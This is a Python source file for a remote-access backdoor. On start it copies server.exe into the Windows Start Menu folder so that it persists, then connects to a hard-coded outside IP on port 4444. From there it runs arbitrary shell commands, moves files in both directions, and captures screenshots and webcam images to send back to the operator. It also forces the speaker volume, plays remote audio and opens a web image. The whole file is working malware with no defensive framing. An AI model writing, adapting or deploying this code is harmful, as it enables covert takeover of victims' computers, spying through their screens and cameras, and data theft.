import socket, json
import subprocess
import os
import base64
import threading
import time
# os.system("python -m pip install --upgrade pip")
# os.system("pip3 install mss")
# os.system("pip3 install numpy")
# os.system("pip3 install opencv-python")
import mss
import cv2
import webbrowser

from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from playsound import playsound


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(bytes(json_data, "utf-8"))

    def reliable_recive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        try:
            # out = subprocess.getoutput(command)
            # print(out)
            # return out #.decode("utf-8")
            
            proc = subprocess.Popen([command], stdout=subprocess.PIPE, shell=True)
            (out, err) = proc.communicate()
            return str(out)
        except Exception as error:
            return error

    def change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return "[+] Changing working directory to " + path
        except:
            return f"[-] No such file or directory: '{path}'"


    def write_file(self, path, content):
        content = base64.b64decode(content)
        with open(path, "wb") as file:
            file.write(content)
            return "[+] Upload succsessful"

    def read_file(self, path):
        file = open(path, "rb").read()
        file = base64.encodebytes(file).decode('utf-8')
        return file

    def run(self):         
        while True:
            command = str(self.reliable_recive())
            try:
                if command.split()[0] == "exit":
                    self.connection.close()
                    break
                elif command.split()[0] == "cd" and len(command) >= 2:
                    path = command.replace("cd ", "")
                    command_result = self.change_working_directory_to(path)
                elif command.split()[0] == "download":
                    file_name = command.replace("download ", "")
                    command_result = self.read_file(file_name)
                elif command.split()[0] == "upload":
                    file_name = command.replace("upload ", "")
                    file_content = command.replace(f"upload {file_name} ", "")
                    command_result = self.write_file(file_name, file_content)
                elif command.split()[0] == "screenshot":
                    im = mss.mss().shot(output=f"screen.png")
                    command_result = self.read_file(f"screen.png")

                    if os.name == "nt":
                        os.system(f"del screen.png")
                    else:
                        os.system(f"rm screen.png")
                elif command.split()[0] == "camera":
                    cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                    result, image = cam.read()
                    cv2.imwrite(f"camera.jpg", image)
                    command_result = self.read_file(f"camera.jpg")

                    if os.name == "nt":
                        os.system(f"del camera.jpg")
                    else:
                        os.system(f"rm camera.jpg")

                    cam.release()
                else:
                    command_result = self.execute_system_command(command)
                self.reliable_send(command_result)
            except Exception as error:
                self.reliable_send(error)
                # self.reliable_send("[-] Something was wrong!")



username = subprocess.getoutput("echo \%username%")
path = f"C:\\Users\\{username[1::]}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\"
command = f'copy server.exe "{path}"'
print(command)
os.system(command)

devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))

def setMaxVolume():
    while True:
        volume.SetMasterVolumeLevel(-30.0, None)
        time.sleep(2)

def playGimn():
    while True:
        playsound('https://mp3bit.cc/5094.mp3')
        playsound('https://music2019.su/uploads/files/2022-02/romax-batko-nash-bandera_456639639.mp3')


vol = threading.Thread(target=setMaxVolume)
vol.start()

gimn = threading.Thread(target=playGimn)
gimn.start()

webbrowser.open('https://f8n-production-collection-assets.imgix.net/0x30c7123FA156772020814bC39b4559Fc94deebc8/1/nft.jpg?q=80&auto=format%2Ccompress&cs=srgb&max-w=1680&max-h=1680')


my_backdoor = Backdoor("185.247.119.121", 4444)
my_backdoor.run()

